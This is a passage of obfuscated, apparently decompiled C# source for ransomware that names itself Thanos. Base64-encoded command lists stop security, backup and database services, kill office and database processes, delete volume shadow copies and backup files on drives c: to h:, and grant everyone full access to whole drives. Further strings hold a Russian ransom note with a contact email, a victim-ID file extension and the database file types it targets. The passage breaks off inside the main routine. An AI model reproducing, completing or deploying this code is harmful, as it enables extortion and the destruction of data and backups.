		jLGThbkXlozfB("c3RvcCBtc2V4Y2hhbmdlYWR0b3BvbG9neSAveQ=="),
		jLGThbkXlozfB("c3RvcCDigJxTb3Bob3MgTUNTIEFnZW504oCdIC95"),
		jLGThbkXlozfB("c3RvcCBBY3JTY2gyU3ZjIC95"),
		jLGThbkXlozfB("c3RvcCBNU09MQVAkVFBTQU1BIC95"),
		jLGThbkXlozfB("c3RvcCDigJxpbnRlbChyKSBwcm9zZXQgbW9uaXRvcmluZyBzZXJ2aWNl4oCdIC95"),
		jLGThbkXlozfB("c3RvcCBtc2V4Y2hhbmdlaW1hcDQgL3k="),
		jLGThbkXlozfB("c3RvcCDigJxTb3Bob3MgTUNTIENsaWVudOKAnSAveQ=="),
		jLGThbkXlozfB("c3RvcCBBUlNNIC95"),
		jLGThbkXlozfB("c3RvcCBNU1NRTCRCS1VQRVhFQyAveQ=="),
		jLGThbkXlozfB("c3RvcCB1bmlzdG9yZXN2Y18xYWY0MGEgL3k="),
		jLGThbkXlozfB("c3RvcCDigJxTb3Bob3MgTWVzc2FnZSBSb3V0ZXLigJ0gL3k="),
		jLGThbkXlozfB("c3RvcCBCYWNrdXBFeGVjQWdlbnRBY2NlbGVyYXRvciAveQ=="),
		jLGThbkXlozfB("c3RvcCBNU1NRTCRFQ1dEQjIgL3k="),
		jLGThbkXlozfB("c3RvcCBhdWRpb2VuZHBvaW50YnVpbGRlciAveQ=="),
		jLGThbkXlozfB("c3RvcCDigJxTb3Bob3MgU2FmZXN0b3JlIFNlcnZpY2XigJ0gL3k="),
		jLGThbkXlozfB("c3RvcCBCYWNrdXBFeGVjQWdlbnRCcm93c2VyIC95"),
		jLGThbkXlozfB("c3RvcCBNU1NRTCRQUkFDVElDRU1HVCAveQ=="),
		jLGThbkXlozfB("c3RvcCDigJxTb3Bob3MgU3lzdGVtIFByb3RlY3Rpb24gU2VydmljZeKAnSAveQ=="),
		jLGThbkXlozfB("c3RvcCBCYWNrdXBFeGVjRGV2aWNlTWVkaWFTZXJ2aWNlIC95"),
		jLGThbkXlozfB("c3RvcCBNU1NRTCRQUkFDVFRJQ0VCR0MgL3k="),
		jLGThbkXlozfB("c3RvcCDigJxTb3Bob3MgV2ViIENvbnRyb2wgU2VydmljZeKAnSAveQ=="),
		jLGThbkXlozfB("c3RvcCBCYWNrdXBFeGVjSm9iRW5naW5lIC95"),
		jLGThbkXlozfB("c3RvcCBNU1NRTCRQUk9EIC95"),
		jLGThbkXlozfB("c3RvcCBBY3JvbmlzQWdlbnQgL3k="),
		jLGThbkXlozfB("c3RvcCBCYWNrdXBFeGVjTWFuYWdlbWVudFNlcnZpY2UgL3k="),
		jLGThbkXlozfB("c3RvcCBNU1NRTCRQUk9GWEVOR0FHRU1FTlQgL3k="),
		jLGThbkXlozfB("c3RvcCBBbnRpdmlydXMgL3k="),
		jLGThbkXlozfB("c3RvcCBCYWNrdXBFeGVjUlBDU2VydmljZSAveQ=="),
		jLGThbkXlozfB("c3RvcCBNU1NRTCRTQlNNT05JVE9SSU5HIC8="),
		jLGThbkXlozfB("c3RvcCBNU1NRTCRTQlNNT05JVE9SSU5HIC95"),
		jLGThbkXlozfB("c3RvcCBBVlAgL3k="),
		jLGThbkXlozfB("c3RvcCBCYWNrdXBFeGVjVlNTUHJvdmlkZXIgL3k="),
		jLGThbkXlozfB("c3RvcCBNU1NRTCRTSEFSRVBPSU5UIC95"),
		jLGThbkXlozfB("c3RvcCBEQ0FnZW50IC95"),
		jLGThbkXlozfB("c3RvcCBiZWRiZyAveQ=="),
		jLGThbkXlozfB("c3RvcCBNU1NRTCRTUUxfMjAwOCAveQ=="),
		jLGThbkXlozfB("c3RvcCBFaHR0cFNydiAveQ=="),
		jLGThbkXlozfB("c3RvcCBNTVMgL3k="),
		jLGThbkXlozfB("c3RvcCBNU1NRTCRTUUxFWFBSRVNTIC95"),
		jLGThbkXlozfB("c3RvcCBla3JuIC95"),
		jLGThbkXlozfB("c3RvcCBtb3p5cHJvYmFja3VwIC95"),
		jLGThbkXlozfB("c3RvcCBNU1NRTCRTWVNURU1fQkdDIC95"),
		jLGThbkXlozfB("c3RvcCBFUFNlY3VyaXR5U2VydmljZSAveQ=="),
		jLGThbkXlozfB("c3RvcCBNU1NRTCRWRUVBTVNRTDIwMDhSMiAveQ=="),
		jLGThbkXlozfB("c3RvcCBNU1NRTCRUUFMgL3k="),
		jLGThbkXlozfB("c3RvcCBFUFVwZGF0ZVNlcnZpY2UgL3k="),
		jLGThbkXlozfB("c3RvcCBudHJ0c2NhbiAveQ=="),
		jLGThbkXlozfB("c3RvcCBNU1NRTCRUUFNBTUEgL3k="),
		jLGThbkXlozfB("c3RvcCBFc2dTaEtlcm5lbCAveQ=="),
		jLGThbkXlozfB("c3RvcCBQRFZGU1NlcnZpY2UgL3k="),
		jLGThbkXlozfB("c3RvcCBNU1NRTCRWRUVBTVNRTDIwMDhSMiAveQ=="),
		jLGThbkXlozfB("c3RvcCBFU0hBU1JWIC95"),
		jLGThbkXlozfB("c3RvcCBTRFJTVkMgL3k="),
		jLGThbkXlozfB("c3RvcCBNU1NRTCRWRUVBTVNRTDIwMTIgL3k="),
		jLGThbkXlozfB("c3RvcCBGQV9TY2hlZHVsZXIgL3k="),
		jLGThbkXlozfB("c3RvcCBTUUxBZ2VudCRWRUVBTVNRTDIwMDhSMiAveQ=="),
		jLGThbkXlozfB("c3RvcCBNU1NRTEZETGF1bmNoZXIkUFJPRlhFTkdBR0VNRU5UIC95"),
		jLGThbkXlozfB("c3RvcCBLQVZGUyAveQ=="),
		jLGThbkXlozfB("c3RvcCBTUUxXcml0ZXIgL3k="),
		jLGThbkXlozfB("c3RvcCBNU1NRTEZETGF1bmNoZXIkU0JTTU9OSVRPUklORyAveQ=="),
		jLGThbkXlozfB("c3RvcCBLQVZGU0dUIC95"),
		jLGThbkXlozfB("c3RvcCBWZWVhbUJhY2t1cFN2YyAveQ=="),
		jLGThbkXlozfB("c3RvcCBNU1NRTEZETGF1bmNoZXIkU0hBUkVQT0lOVCAveQ=="),
		jLGThbkXlozfB("c3RvcCBrYXZmc3NscCAveQ=="),
		jLGThbkXlozfB("c3RvcCBWZWVhbUJyb2tlclN2YyAveQ=="),
		jLGThbkXlozfB("c3RvcCBNU1NRTEZETGF1bmNoZXIkU1FMXzIwMDggL3k="),
		jLGThbkXlozfB("c3RvcCBrbG5hZ2VudCAveQ=="),
		jLGThbkXlozfB("c3RvcCBWZWVhbUNhdGFsb2dTdmMgL3k="),
		jLGThbkXlozfB("c3RvcCBNU1NRTEZETGF1bmNoZXIkU1lTVEVNX0JHQyAveQ=="),
		jLGThbkXlozfB("c3RvcCBtYWNtbnN2YyAveQ=="),
		jLGThbkXlozfB("c3RvcCBWZWVhbUNsb3VkU3ZjIC95"),
		jLGThbkXlozfB("c3RvcCBNU1NRTEZETGF1bmNoZXIkVFBTIC95"),
		jLGThbkXlozfB("c3RvcCBtYXN2YyAveQ=="),
		jLGThbkXlozfB("c3RvcCBWZWVhbURlcGxveW1lbnRTZXJ2aWNlIC95"),
		jLGThbkXlozfB("c3RvcCBNU1NRTEZETGF1bmNoZXIkVFBTQU1BIC95"),
		jLGThbkXlozfB("c3RvcCBNQkFNU2VydmljZSAveQ=="),
		jLGThbkXlozfB("c3RvcCBWZWVhbURlcGxveVN2YyAveQ=="),
		jLGThbkXlozfB("c3RvcCBNU1NRTFNFUlZFUiAveQ=="),
		jLGThbkXlozfB("c3RvcCBNQkVuZHBvaW50QWdlbnQgL3k="),
		jLGThbkXlozfB("c3RvcCBWZWVhbUVudGVycHJpc2VNYW5hZ2VyU3ZjIC95"),
		jLGThbkXlozfB("c3RvcCBNU1NRTFNlcnZlckFESGVscGVyIC95"),
		jLGThbkXlozfB("c3RvcCBNY0FmZWVFbmdpbmVTZXJ2aWNlIC95"),
		jLGThbkXlozfB("c3RvcCBWZWVhbUh2SW50ZWdyYXRpb25TdmMgL3k="),
		jLGThbkXlozfB("c3RvcCBNU1NRTFNlcnZlckFESGVscGVyMTAwIC95"),
		jLGThbkXlozfB("c3RvcCBNY0FmZWVGcmFtZXdvcmsgL3k="),
		jLGThbkXlozfB("c3RvcCBWZWVhbU1vdW50U3ZjIC95"),
		jLGThbkXlozfB("c3RvcCBNU1NRTFNlcnZlck9MQVBTZXJ2aWNlIC95"),
		jLGThbkXlozfB("c3RvcCBNY0FmZWVGcmFtZXdvcmtNY0FmZWVGcmFtZXdvcmsgL3k="),
		jLGThbkXlozfB("c3RvcCBWZWVhbU5GU1N2YyAveQ=="),
		jLGThbkXlozfB("c3RvcCBNeVNRTDU3IC95"),
		jLGThbkXlozfB("c3RvcCBNY1NoaWVsZCAveQ=="),
		jLGThbkXlozfB("c3RvcCBWZWVhbVJFU1RTdmMgL3k="),
		jLGThbkXlozfB("c3RvcCBNeVNRTDgwIC95"),
		jLGThbkXlozfB("c3RvcCBNY1Rhc2tNYW5hZ2VyIC95"),
		jLGThbkXlozfB("c3RvcCBWZWVhbVRyYW5zcG9ydFN2YyAveQ=="),
		jLGThbkXlozfB("c3RvcCBPcmFjbGVDbGllbnRDYWNoZTgwIC95"),
		jLGThbkXlozfB("c3RvcCBtZmVmaXJlIC95"),
		jLGThbkXlozfB("c3RvcCB3YmVuZ2luZSAveQ=="),
		jLGThbkXlozfB("c3RvcCBSZXBvcnRTZXJ2ZXIkU1FMXzIwMDggL3k="),
		jLGThbkXlozfB("c3RvcCBtZmVtbXMgL3k="),
		jLGThbkXlozfB("c3RvcCB3YmVuZ2luZSAveQ=="),
		jLGThbkXlozfB("c3RvcCBSRVN2YyAveQ=="),
		jLGThbkXlozfB("c3RvcCBtZmV2dHAgL3k="),
		jLGThbkXlozfB("c3RvcCBzbXNfc2l0ZV9zcWxfYmFja3VwIC95"),
		jLGThbkXlozfB("c3RvcCBTUUxBZ2VudCRCS1VQRVhFQyAveQ=="),
		jLGThbkXlozfB("c3RvcCBNU1NRTCRTT1BIT1MgL3k="),
		jLGThbkXlozfB("c3RvcCBTUUxBZ2VudCRDSVRSSVhfTUVUQUZSQU1FIC95"),
		jLGThbkXlozfB("c3RvcCBzYWNzdnIgL3k="),
		jLGThbkXlozfB("c3RvcCBTUUxBZ2VudCRDWERCIC95"),
		jLGThbkXlozfB("c3RvcCBTQVZBZG1pblNlcnZpY2UgL3k="),
		jLGThbkXlozfB("c3RvcCBTUUxBZ2VudCRFQ1dEQjIgL3k="),
		jLGThbkXlozfB("c3RvcCBTQVZTZXJ2aWNlIC95"),
		jLGThbkXlozfB("c3RvcCBTUUxBZ2VudCRQUkFDVFRJQ0VCR0MgL3k="),
		jLGThbkXlozfB("c3RvcCBTZXBNYXN0ZXJTZXJ2aWNlIC95"),
		jLGThbkXlozfB("c3RvcCBTUUxBZ2VudCRQUkFDVFRJQ0VNR1QgL3k="),
		jLGThbkXlozfB("c3RvcCBTaE1vbml0b3IgL3k="),
		jLGThbkXlozfB("c3RvcCBTUUxBZ2VudCRQUk9EIC95"),
		jLGThbkXlozfB("c3RvcCBTbWNpbnN0IC95"),
		jLGThbkXlozfB("c3RvcCBTUUxBZ2VudCRQUk9GWEVOR0FHRU1FTlQgL3k="),
		jLGThbkXlozfB("c3RvcCBTbWNTZXJ2aWNlIC95"),
		jLGThbkXlozfB("c3RvcCBTUUxBZ2VudCRTQlNNT05JVE9SSU5HIC95"),
		jLGThbkXlozfB("c3RvcCBTbnRwU2VydmljZSAveQ=="),
		jLGThbkXlozfB("c3RvcCBTUUxBZ2VudCRTSEFSRVBPSU5UIC95"),
		jLGThbkXlozfB("c3RvcCBzb3Bob3NzcHMgL3k="),
		jLGThbkXlozfB("c3RvcCBTUUxBZ2VudCRTUUxfMjAwOCAveQ=="),
		jLGThbkXlozfB("c3RvcCBTUUxBZ2VudCRTT1BIT1MgL3k="),
		jLGThbkXlozfB("c3RvcCBTUUxBZ2VudCRTUUxFWFBSRVNTIC95"),
		jLGThbkXlozfB("c3RvcCBzdmNHZW5lcmljSG9zdCAveQ=="),
		jLGThbkXlozfB("c3RvcCBTUUxBZ2VudCRTWVNURU1fQkdDIC95"),
		jLGThbkXlozfB("c3RvcCBzd2lfZmlsdGVyIC95"),
		jLGThbkXlozfB("c3RvcCBTUUxBZ2VudCRUUFMgL3k="),
		jLGThbkXlozfB("c3RvcCBzd2lfc2VydmljZSAveQ=="),
		jLGThbkXlozfB("c3RvcCBTUUxBZ2VudCRUUFNBTUEgL3k="),
		jLGThbkXlozfB("c3RvcCBzd2lfdXBkYXRlIC95"),
		jLGThbkXlozfB("c3RvcCBTUUxBZ2VudCRWRUVBTVNRTDIwMDhSMiAveQ=="),
		jLGThbkXlozfB("c3RvcCBzd2lfdXBkYXRlXzY0IC95"),
		jLGThbkXlozfB("c3RvcCBTUUxBZ2VudCRWRUVBTVNRTDIwMTIgL3k="),
		jLGThbkXlozfB("c3RvcCBUbUNDU0YgL3k="),
		jLGThbkXlozfB("c3RvcCBTUUxCcm93c2VyIC95"),
		jLGThbkXlozfB("c3RvcCB0bWxpc3RlbiAveQ=="),
		jLGThbkXlozfB("c3RvcCBTUUxTYWZlT0xSU2VydmljZSAveQ=="),
		jLGThbkXlozfB("c3RvcCBUcnVlS2V5IC95"),
		jLGThbkXlozfB("c3RvcCBTUUxTRVJWRVJBR0VOVCAveQ=="),
		jLGThbkXlozfB("c3RvcCBUcnVlS2V5U2NoZWR1bGVyIC95"),
		jLGThbkXlozfB("c3RvcCBTUUxURUxFTUVUUlkgL3k="),
		jLGThbkXlozfB("c3RvcCBUcnVlS2V5U2VydmljZUhlbHBlciAveQ=="),
		jLGThbkXlozfB("c3RvcCBTUUxURUxFTUVUUlkkRUNXREIyIC95"),
		jLGThbkXlozfB("c3RvcCBXUlNWQyAveQ=="),
		jLGThbkXlozfB("c3RvcCBtc3NxbCR2aW1fc3FsZXhwIC95"),
		jLGThbkXlozfB("c3RvcCB2YXBpZW5kcG9pbnQgL3k=")
	};

	public static List<string> dUjxItPnQNdt = new List<string>
	{
		jLGThbkXlozfB("Y29uZmlnIERuc2NhY2hlIHN0YXJ0PSBhdXRv"),
		jLGThbkXlozfB("Y29uZmlnIEZEUmVzUHViIHN0YXJ0PSBhdXRv"),
		jLGThbkXlozfB("Y29uZmlnIFNTRFBTUlYgc3RhcnQ9IGF1dG8="),
		jLGThbkXlozfB("Y29uZmlnIHVwbnBob3N0IHN0YXJ0PSBhdXRv"),
		jLGThbkXlozfB("Y29uZmlnIFNRTFRFTEVNRVRSWSBzdGFydD0gZGlzYWJsZWQ="),
		jLGThbkXlozfB("Y29uZmlnIFNRTFRFTEVNRVRSWSRFQ1dEQjIgc3RhcnQ9IGRpc2FibGVk"),
		jLGThbkXlozfB("Y29uZmlnIFNRTFdyaXRlciBzdGFydD0gZGlzYWJsZWQ="),
		jLGThbkXlozfB("Y29uZmlnIFNzdHBTdmMgc3RhcnQ9IGRpc2FibGVk")
	};

	public static List<string> iREfJhsvOQZG = new List<string>
	{
		jLGThbkXlozfB("L0lNIG1zcHViLmV4ZSAvRg=="),
		jLGThbkXlozfB("L0lNIG15ZGVza3RvcHFvcy5leGUgL0Y="),
		jLGThbkXlozfB("L0lNIG15ZGVza3RvcHNlcnZpY2UuZXhlIC9G"),
		jLGThbkXlozfB("L0lNIG15c3FsZC5leGUgL0Y="),
		jLGThbkXlozfB("L0lNIHNxYmNvcmVzZXJ2aWNlLmV4ZSAvRg=="),
		jLGThbkXlozfB("L0lNIGZpcmVmb3hjb25maWcuZXhlIC9G"),
		jLGThbkXlozfB("L0lNIGFnbnRzdmMuZXhlIC9G"),
		jLGThbkXlozfB("L0lNIHRoZWJhdC5leGUgL0Y="),
		jLGThbkXlozfB("L0lNIHN0ZWFtLmV4ZSAvRg=="),
		jLGThbkXlozfB("L0lNIGVuY3N2Yy5leGUgL0Y="),
		jLGThbkXlozfB("L0lNIGV4Y2VsLmV4ZSAvRg=="),
		jLGThbkXlozfB("L0lNIENOVEFvU01nci5leGUgL0Y="),
		jLGThbkXlozfB("L0lNIHNxbHdyaXRlci5leGUgL0Y="),
		jLGThbkXlozfB("L0lNIHRiaXJkY29uZmlnLmV4ZSAvRg=="),
		jLGThbkXlozfB("L0lNIGRiZW5nNTAuZXhlIC9G"),
		jLGThbkXlozfB("L0lNIHRoZWJhdDY0LmV4ZSAvRg=="),
		jLGThbkXlozfB("L0lNIG9jb21tLmV4ZSAvRg=="),
		jLGThbkXlozfB("L0lNIGluZm9wYXRoLmV4ZSAvRg=="),
		jLGThbkXlozfB("L0lNIG1iYW10cmF5LmV4ZSAvRg=="),
		jLGThbkXlozfB("L0lNIHpvb2x6LmV4ZSAvRg=="),
		jLGThbkXlozfB("SU0gdGh1bmRlcmJpcmQuZXhlIC9G"),
		jLGThbkXlozfB("L0lNIGRic25tcC5leGUgL0Y="),
		jLGThbkXlozfB("L0lNIHhmc3N2Y2Nvbi5leGUgL0Y="),
		jLGThbkXlozfB("L0lNIG1zcHViLmV4ZSAvRg=="),
		jLGThbkXlozfB("L0lNIE50cnRzY2FuLmV4ZSAvRg=="),
		jLGThbkXlozfB("L0lNIGlzcWxwbHVzc3ZjLmV4ZSAvRg=="),
		jLGThbkXlozfB("L0lNIG9uZW5vdGUuZXhlIC9G"),
		jLGThbkXlozfB("L0lNIFBjY05UTW9uLmV4ZSAvRg=="),
		jLGThbkXlozfB("L0lNIG1zYWNjZXNzLmV4ZSAvRg=="),
		jLGThbkXlozfB("L0lNIG91dGxvb2suZXhlIC9G"),
		jLGThbkXlozfB("L0lNIHRtbGlzdGVuLmV4ZSAvRg=="),
		jLGThbkXlozfB("L0lNIG1zZnRlc3FsLmV4ZSAvRg=="),
		jLGThbkXlozfB("L0lNIHBvd2VycG50LmV4ZSAvRg=="),
		jLGThbkXlozfB("L0lNIG15ZGVza3RvcHFvcy5leGUgL0Y="),
		jLGThbkXlozfB("L0lNIHZpc2lvLmV4ZSAvRg=="),
		jLGThbkXlozfB("L0lNIG15ZGVza3RvcHNlcnZpY2UuZXhlIC9G"),
		jLGThbkXlozfB("L0lNIHdpbndvcmQuZXhlIC9G"),
		jLGThbkXlozfB("L0lNIG15c3FsZC1udC5leGUgL0Y="),
		jLGThbkXlozfB("L0lNIHdvcmRwYWQuZXhlIC9G"),
		jLGThbkXlozfB("L0lNIG15c3FsZC1vcHQuZXhlIC9G"),
		jLGThbkXlozfB("L0lNIG9jYXV0b3VwZHMuZXhlIC9G"),
		jLGThbkXlozfB("L0lNIG9jc3NkLmV4ZSAvRg=="),
		jLGThbkXlozfB("L0lNIG9yYWNsZS5leGUgL0Y="),
		jLGThbkXlozfB("L0lNIHNxbGFnZW50LmV4ZSAvRg=="),
		jLGThbkXlozfB("L0lNIHNxbGJyb3dzZXIuZXhlIC9G"),
		jLGThbkXlozfB("L0lNIHNxbHNlcnZyLmV4ZSAvRg=="),
		jLGThbkXlozfB("L0lNIHN5bmN0aW1lLmV4ZSAvRg==")
	};

	public static List<string> JYQmAzdqcxULKnC = new List<string>
	{
		jLGThbkXlozfB(izdftkkvVp("=QXZpVXcvACbsF2LgM3dvRWYoNFIlRXZsVGR")),
		jLGThbkXlozfB("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1jOiAvb249YzogL21heHNpemU9NDAxTUI="),
		jLGThbkXlozfB("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1jOiAvb249YzogL21heHNpemU9dW5ib3VuZGVk"),
		jLGThbkXlozfB("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1kOiAvb249ZDogL21heHNpemU9NDAxTUI="),
		jLGThbkXlozfB("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1kOiAvb249ZDogL21heHNpemU9dW5ib3VuZGVk"),
		jLGThbkXlozfB("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1lOiAvb249ZTogL21heHNpemU9NDAxTUI="),
		jLGThbkXlozfB("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1lOiAvb249ZTogL21heHNpemU9dW5ib3VuZGVk"),
		jLGThbkXlozfB("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1mOiAvb249ZjogL21heHNpemU9NDAxTUI="),
		jLGThbkXlozfB("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1mOiAvb249ZjogL21heHNpemU9dW5ib3VuZGVk"),
		jLGThbkXlozfB("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1nOiAvb249ZzogL21heHNpemU9NDAxTUI="),
		jLGThbkXlozfB("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1nOiAvb249ZzogL21heHNpemU9dW5ib3VuZGVk"),
		jLGThbkXlozfB("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1oOiAvb249aDogL21heHNpemU9NDAxTUI="),
		jLGThbkXlozfB("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1oOiAvb249aDogL21heHNpemU9dW5ib3VuZGVk"),
		jLGThbkXlozfB(izdftkkvVp("=QXZpVXcvACbsF2LgM3dvRWYoNFIlRXZsVGR"))
	};

	public static string uNzPBpjIavDZ = jLGThbkXlozfB("R2V0LVdtaU9iamVjdCBXaW4zMl9TaGFkb3djb3B5IHwgRm9yRWFjaC1PYmplY3QgeyAkX0RlbGV0ZSgpOyB9");

	public static List<string> RVqWYkzoWxGm = new List<string>
	{
		jLGThbkXlozfB("L3MgL2YgL3EgYzpcKi5WSEQgYzpcKi5iYWMgYzpcKi5iYWsgYzpcKi53YmNhdCBjOlwqLmJrZiBjOlxCYWNrdXAqLiogYzpcYmFja3VwKi4qIGM6XCouc2V0IGM6XCoud2luIGM6XCouZHNr"),
		jLGThbkXlozfB("L3MgL2YgL3EgZDpcKi5WSEQgZDpcKi5iYWMgZDpcKi5iYWsgZDpcKi53YmNhdCBkOlwqLmJrZiBkOlxCYWNrdXAqLiogZDpcYmFja3VwKi4qIGQ6XCouc2V0IGQ6XCoud2luIGQ6XCouZHNr"),
		jLGThbkXlozfB("L3MgL2YgL3EgZTpcKi5WSEQgZTpcKi5iYWMgZTpcKi5iYWsgZTpcKi53YmNhdCBlOlwqLmJrZiBlOlxCYWNrdXAqLiogZTpcYmFja3VwKi4qIGU6XCouc2V0IGU6XCoud2luIGU6XCouZHNr"),
		jLGThbkXlozfB("L3MgL2YgL3EgZjpcKi5WSEQgZjpcKi5iYWMgZjpcKi5iYWsgZjpcKi53YmNhdCBmOlwqLmJrZiBmOlxCYWNrdXAqLiogZjpcYmFja3VwKi4qIGY6XCouc2V0IGY6XCoud2luIGY6XCouZHNr"),
		jLGThbkXlozfB("L3MgL2YgL3EgZzpcKi5WSEQgZzpcKi5iYWMgZzpcKi5iYWsgZzpcKi53YmNhdCBnOlwqLmJrZiBnOlxCYWNrdXAqLiogZzpcYmFja3VwKi4qIGc6XCouc2V0IGc6XCoud2luIGc6XCouZHNr"),
		jLGThbkXlozfB("L3MgL2YgL3EgaDpcKi5WSEQgaDpcKi5iYWMgaDpcKi5iYWsgaDpcKi53YmNhdCBoOlwqLmJrZiBoOlxCYWNrdXAqLiogaDpcYmFja3VwKi4qIGg6XCouc2V0IGg6XCoud2luIGg6XCouZHNr")
	};

	public static List<string> fnJYaYxCfJiL = new List<string>
	{
		jLGThbkXlozfB("IkM6KiIgL2dyYW50IEV2ZXJ5b25lOkYgL1QgL0MgL1E="),
		jLGThbkXlozfB("IkQ6KiIgL2dyYW50IEV2ZXJ5b25lOkYgL1QgL0MgL1E="),
		jLGThbkXlozfB("Ilo6KiIgL2dyYW50IEV2ZXJ5b25lOkYgL1QgL0MgL1E=")
	};

	public static string amFRGHgQcJN = "NO";

	public static string mWPqddGpHqa = "NO";

	internal static DateTime NhSwGbCoZjK = new DateTime(2000, 1, 1);

	internal static DateTime SdwNhoBgGmWy = new DateTime(2100, 1, 1);

	public static string UuZGAMCoQIPQQk = "YES";

	public static string OQWxDJYHGaO = "10";

	public static string bWUhszpWYNSz = "NO";

	public static string ASiCsvMjyNsJ = "NO";

	public static string TAbovsIzzc = "NO";

	public static string UIUxFnsmcvEL = "YES";

	public static string bTKcrEXcTJyWfaHr = "NO";

	public static string mAubhToVWX = "NO";

	public static List<string> DqnvzCWPBFOfV = new List<string> { "docx", "pdf", "xlsx", "csv" };

	public static string gfooytrIBEuhQ = "NO";

	public static string PHGxbhgUwHl = "1";

	public static string hzkOxbKIgLJV = "YES";

	public static string mgSjwFXucAZdEw = "NO";

	public static string rlalVTJJXYxF = "NO";

	public static string xvavKZhscsP = string.Empty;

	public static string vIcvZOinmjJnA = "NO";

	public static string NEFPxtrjgZ = "YES";

	public static string VDlpecGDwmX = "YES";

	public static string xdQpJyposWQM = "0JLQvdC40LzQsNC90LjQtSDQktC90LjQvNCw0L3QuNC1INCS0L3QuNC80LDQvdC40LUhISE=";

	public static string TdzNEHQWtScWW = "0JTQvtCx0YDRi9C5INC00LXQvdGMLiDQoyDQktCw0YEg0LLQvtC30L3QuNC60LvQuCDRgdC70L7QttC90L7RgdGC0Lgg0L3QsCDRgNCw0LHQvtGC0LU/IA0K0J3QtSDRgdGC0L7QuNGCINC/0LXRgNC10LbQuNCy0LDRgtGMLCDQvdCw0YjQuCBJVC3RgdC/0LXRhtC40LDQu9C40YHRgtGLINC/0L7QvNC+0LPRg9GCINCS0LDQvC4NCtCU0LvRjyDRjdGC0L7Qs9C+INC90LDQv9C40YjQuNGC0LUg0L/QvtC20LDQu9GD0LnRgdGC0LAg0L3QsNC8INC90LAg0L/QvtGH0YLRgy4NCg0K0J3QsNGIIGVtYWlsIC0gY3liZXJAb3V0bG9va3Byby5uZXQNCg0K0KXQvtGA0L7RiNC10LPQviDQuCDQv9GA0L7QtNGD0LrRgtC40LLQvdC+0LPQviDQtNC90Y8h";

	public static string zOoIhdPpngLQt = "NO";

	public static string WiaPiYoSCi = "YES";

	public static string deftsIkXRkE = "NO";

	public static string LyuYVriLWpUSFt = "NO";

	public static string HMuGDIOALryxy = "NO";

	public static string qtOGorXHUhd = "LOGONISOFF";

	public static string XqAOyhKPlTsF = "NO";

	public static string jFHIFsIuvqjiRrm = "YES";

	public static string jMMJJGmjJwKTlH = "reload1.lnk";

	public static string uQrJPYIBZmsaW = "NO";

	public static string fwyvOUErjoRGs = "YES";

	public static string IHClMeemgdD = "NO";

	public static string XlMZZRHaUB = "NO";

	public static string furQMgHwAVy = "VGhhbm9z";

	public static string mArUGYtygjbh = "YES";

	public static string pCwzfECATcgjvGf = "YES";

	public static string inzCiQTECWHJdj = "NO";

	public static string oLbPEODNywhpzfGE = "YES";

	public static string[] xIJoCgpUCtQ = new string[10] { "ragent.exe", "rmngr.exe", "rphost.exe", "1cv8.exe", "sql.exe", "sqld.exe", "mysql.exe", "mysqld.exe", "oracle.exe", "vmwp.exe" };

	public static string cIiOGifyTwmZ = "YES";

	public static bool UZbqPEyevT = true;

	public static string zJmmJdPFvowyuLu = "YES";

	public static bool gIEIPYSAmb = false;

	public static bool vPxSRRyjgDzUS = true;

	public static bool vzPdfnHBMtjz = true;

	public static bool AHfrqVLDuttKkxFeo = true;

	public static string HXSuIBiFjcFlYv = "Debug_Log.txt";

	public static bool dwCcrxocWgDvY = false;

	public static bool tzMPHLxBCwas = true;

	public static bool ilGORNmyHnqImSU = true;

	public static bool efRXIEwEUukcfR = false;

	public static bool EepcEiTneJt = true;

	public static string QHZTFDubwp = "UserName=" + Environment.UserName + "_MachineName=" + Environment.MachineName + "_" + dOKSsqBdzEjH.ptoqsMamSwGuxR() + ".txt";

	public static bool MFBaFacYIYTeS = false;

	public static Stopwatch TGCggkmVHIBbRyY = new Stopwatch();

	public static int sasdvwkURzh = 0;

	public static int MkfVCujHefEQ = 0;

	public static bool VWdYBLRBOWpKB = false;

	public static string eyshXlTBtKESKXUD = ".[ID-" + dOKSsqBdzEjH.ptoqsMamSwGuxR() + "]";

	public static string[] QhiOPycABLL = new string[1] { "\"db\",\"dbf\",\"accdb\",\"dbx\",\"mdb\",\"mdf\",\"epf\",\"ndf\",\"ldf\",\"1cd\",\"sdf\",\"nsf\",\"fp7\",\"cat\",\"log\"" };

	public static List<string> idkPIFBWhafRe = new List<string>();

	public static int PXrJUxZGiZRJBh = 0;

	public static bool OpScyAmeLLoG = true;

	public static List<string> yeyrItoqAVY = new List<string>();

	public static List<string> FyvlwASchHBAoi = new List<string>();

	public static List<string> KKGPrkSpWNwWdJv = new List<string>();

	[DllImport("kernel32.dll")]
	private static extern bool SetProcessShutdownParameters(uint uQGLJcmlHISwgF, uint TXkFNWIHgT);

	private static void Main(string[] args)
	{
		try
		{
			string QPVswSqKSwkM = Process.GetCurrentProcess().ProcessName;
			if (Process.GetProcesses().Count((Process p) => p.ProcessName == QPVswSqKSwkM) > 1)
			{
				return;
			}
		}
		catch (Exception)
		{
		}
		try
		{
			PjJmBBFcROqRBW.NCUHNCZSansvafM(loiawqaEulG);
		}
		catch (Exception)
		{
		}
		try
		{
			if (mArUGYtygjbh == "YES")
			{
				Thread thread = new Thread(LDfykLXjlFpQSe.natDVoWCqdF);
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
		}
		catch
		{
		}
		SetProcessShutdownParameters(0u, 0u);
		if (WRWNiHGEUcLBskjN == "YES")
		{
			Thread.Sleep(int.Parse(jaiuBHaLnwEwAG));
		}
		if (hzkOxbKIgLJV == "YES")
		{
			try
			{
				if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
				{
					string[] wYdUGPCdlHxOyfY = new string[4]
					{
						jLGThbkXlozfB("VGFza21ncg=="),
